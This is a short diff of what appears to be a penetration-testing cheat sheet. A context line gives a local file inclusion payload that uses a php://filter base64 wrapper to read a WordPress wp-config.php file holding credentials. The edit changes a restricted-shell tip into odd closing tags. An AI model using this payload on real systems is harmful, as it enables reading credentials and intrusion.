@@ -87,4 +87,4 @@ Example (with LFI, wp file)
 http://[IP]/lx.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
 
 ## Check commands in a restricted shell
-"<TAB> <TAB>"
+"</TAB> </TAB>"
